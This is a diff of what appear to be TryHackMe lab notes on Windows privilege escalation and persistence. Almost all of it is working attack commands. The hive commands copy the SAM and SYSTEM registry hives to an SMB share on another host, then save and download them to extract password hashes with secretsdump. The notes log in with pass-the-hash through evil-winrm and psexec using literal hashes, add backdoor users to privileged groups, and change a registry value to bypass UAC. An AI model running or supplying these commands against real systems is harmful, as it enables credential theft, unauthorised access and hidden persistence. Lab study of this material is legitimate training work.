@@ -361,7 +361,8 @@ copy C:\Users\THMBackup\sam.hive \\10.11.99.141\public\
 copy C:\Users\THMBackup\system.hive \\10.11.99.141\public\
 4️⃣ # Extraction of password hashs from registry files with impacket secretsdump.py tools
 sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
-5️⃣ # Pass-the-Hash attack to log in as Administrator with impacket psexec.py tools
+5️⃣ # Pass-the-Hash attack to log in as Administrator with impacket psexec.py tools or Evil-WinRM
+evil-winrm -i 10.10.235.96 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
 sudo python /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.235.96
 ```
 
@@ -463,18 +464,23 @@ lsadump::sam # list of password
 ```
 # Windows-Local-Persistence ✅
 
-> [!Note]
-> 
-
 ```powershell
 net localgroup administrators thmuser0 /add # Add User to Administrators Group (Administrators)
+----------------------------------------------------------
 net localgroup "Backup Operators" thmuser1 /add # Use the "Backup Operators" group (more secret than the previous method)
 net localgroup "Remote Management Users" thmuser1 /add # Add thmuser1 to "Remote Management Users Group" to enable RDP or WINRM connection
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 # Bypass UAC to activate “Backup Operators”
-
-evil-winrm -i 10.10.233.240 -u thmuser1 -p Password321
 whoami /groups
+----------------------------------------------------------
+evil-winrm -i 10.10.233.240 -u thmuser1 -p Password321
 
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+download system.bak
+download sam.bak
 
+sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+----------------------------------------------------------
+evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 
 ```
